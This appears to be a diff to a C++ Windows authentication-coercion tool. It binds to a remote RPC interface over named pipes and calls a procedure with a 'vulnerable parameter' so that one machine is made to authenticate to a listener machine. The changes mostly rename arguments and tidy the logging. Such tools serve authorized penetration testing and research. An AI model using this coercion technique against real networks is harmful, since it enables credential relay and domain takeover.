@@ -16,15 +16,15 @@
 
 ArgumentsParser parseArgs(int argc, char* argv[]) {
 	ArgumentsParser parser = ArgumentsParser();
-	parser.add_string_argument("target", "-t", "--target", "", true, "IP or adress of the target machine");
-	parser.add_string_argument("listener", "-l", "--listener", "", true, "Listener machine.");
+	parser.add_string_argument("from", "-f", "--from", "", true, "IP or hostname of the machine to coerce to authenticate.");
+	parser.add_string_argument("to", "-t", "--to", "", true, "IP or hostname of the machine receiving the coerced authentication.");
 	parser.add_boolean_switch_argument("verbose", "-v", "--verbose", false, false, "Verbose mode.");
 	parser.parse_args(argc, argv);
 	return parser;
 }
 
 
-handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAddress, wchar_t* target)
+handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAddress, wchar_t* target, bool verbose)
 {
 	wchar_t NetworkAddr[MAX_PATH];
 
@@ -52,48 +52,56 @@ handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAdd
 	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew
 	RpcStatus = RpcStringBindingComposeW(InterfaceUUID, (RPC_WSTR)L"ncacn_np", (RPC_WSTR)NetworkAddr, InterfaceAddress, NULL, &StringBinding);
 	if (RpcStatus != RPC_S_OK) {
-		printf("[error] RpcStringBindingComposeW returned %d\n", RpcStatus);
+		printf("[!] Error: RpcStringBindingComposeW returned %d\n", RpcStatus);
 		return (0);
 	} else {
-		printf("[verbose] Created RPC StringBinding: %ls\n", (wchar_t*)StringBinding);
+		if (verbose) {
+			printf("[>] Created RPC StringBinding: %ls\n", (wchar_t*)StringBinding);
+		}
 	}
 
 	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingfromstringbindingw
 	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hBinding);
 	if (RpcStatus != RPC_S_OK) {
-		printf("[error] RpcBindingFromStringBindingW returned %d\n", RpcStatus);
+		printf("[!] Error: RpcBindingFromStringBindingW returned %d\n", RpcStatus);
 		return (0);
 	} else {
-		printf("[verbose] Successfully created binding from string.\n");
+		if (verbose) {
+			printf("[>] Successfully created binding from string.\n");
+		}
 	}
 
 	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringfreew
 	RpcStatus = RpcStringFreeW(&StringBinding);
 	if (RpcStatus != RPC_S_OK) {
-		printf("[error] RpcStringFreeW returned %d\n", RpcStatus);
+		printf("[!] Error: RpcStringFreeW returned %d\n", RpcStatus);
 		return (0);
 	} else {
-		printf("[verbose] Successfully freed RPC StringBinding.\n");
+		if (verbose) {
+			printf("[>] Successfully freed RPC StringBinding.\n");
+		}
 	}
 
 	// http://msdn2.microsoft.com/en-us/library/ms682007.aspx
 	if (AuthIdentity.UserLength == 0) {
 		// Context with default Credentials
-		printf("[verbose] Using current user session credentials.\n");
+		printf("[>] Using current user session credentials.\n");
 		RpcStatus = RpcBindingSetAuthInfoW(hBinding, (RPC_WSTR)target, AuthnLevel, AuthnSvc, NULL, AuthzSvc);
 	}
 	else {
 		// Context with supplied Credentials
-		printf("[verbose] Using user supplied credentials.\n");
+		printf("[>] Using user supplied credentials.\n");
 		print_auth_identity(&AuthIdentity);
 		RpcStatus = RpcBindingSetAuthInfoW(hBinding, (RPC_WSTR)target, AuthnLevel, AuthnSvc, (RPC_AUTH_IDENTITY_HANDLE)&AuthIdentity, AuthzSvc);
 	}
 	if (RpcStatus != RPC_S_OK) {
-		printf("[error] RpcBindingSetAuthInfoW returned %d\n", RpcStatus);
+		printf("[!] Error: RpcBindingSetAuthInfoW returned %d\n", RpcStatus);
 		return (0);
 	}
 	else {
-		printf("[verbose] Authentication information successfully set.\n");
+		if (verbose) {
+			printf("[>] Authentication information successfully set.\n");
+		}
 	}
 
 	return hBinding;
@@ -102,12 +110,12 @@ handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAdd
 
 
 int perform_call(
-	const char * fname, const char * vulnparam_name, wchar_t * vulnparam_value,
+	const char * fname, const char * vulnparam_name, wchar_t * vulnparam_value, bool verbose,
 	// RPC parameters
 	handle_t hBinding, wchar_t* FileName, unsigned long OpenFlag
 ) {
 	HRESULT hr;
-	printf("[verbose] Calling %s(%s=\"%ls\").\n", fname, vulnparam_name, vulnparam_value);
+	printf("[+] Calling %s(%s=\"%ls\").\n", fname, vulnparam_name, vulnparam_value);
 	__try
 	{
 		// Change call here according to your IDL
@@ -118,7 +126,7 @@ int perform_call(
 		PrintWin32Error(GetExceptionCode());
 		return -1;
 	}
-	printf("[verbose] %s returned 0x%08x.\n", fname, hr);
+	printf("[+] %s returned 0x%08x.\n", fname, hr);
 	return 0;
 }
 
@@ -132,18 +140,20 @@ int main(int argc, char* argv[])
 
 	ArgumentsParser parser = parseArgs(argc, argv);
 	bool verbose = std::get<bool>(parser.get_value("verbose"));
-	std::string target = std::get<std::string>(parser.get_value("target"));
+	// Get and convert parser value "from"
+	std::string target = std::get<std::string>(parser.get_value("from"));
 	std::wstring target_w = std::wstring(target.begin(), target.end());
 	wchar_t* target_w_ptr = (wchar_t*)(target_w.c_str());
-	std::string listener = std::get<std::string>(parser.get_value("listener"));
+	// Get and convert parser value "to"
+	std::string listener = std::get<std::string>(parser.get_value("to"));
 	std::wstring listener_w = std::wstring(listener.begin(), listener.end());
 	wchar_t* listener_w_ptr = (wchar_t*)(listener_w.c_str());
 
 	if (verbose) {
-		std::cout << "[verbose] Coercing " << target << " to authenticate to " << listener << " using remote procedure " << remote_procedure_name << "(...)\n";
+		std::cout << "[>] Coercing " << target << " to authenticate to " << listener << " using remote procedure " << remote_procedure_name << "(...)\n";
 	}
 
-	handle_t hBinding = RpcBindHandle(InterfaceUUID, InterfaceAddress, target_w_ptr);
+	handle_t hBinding = RpcBindHandle(InterfaceUUID, InterfaceAddress, target_w_ptr, verbose);
 
 	// Preparing arguments
 	wchar_t FileName[MAX_PATH];
@@ -153,7 +163,7 @@ int main(int argc, char* argv[])
 	// Performing the call
 	int ret = perform_call(
 		// Debug info
-		remote_procedure_name, vulnerable_parameter, FileName,
+		remote_procedure_name, vulnerable_parameter, FileName, verbose,
 		// RPC params
 		hBinding, FileName, OpenFlag
 	);
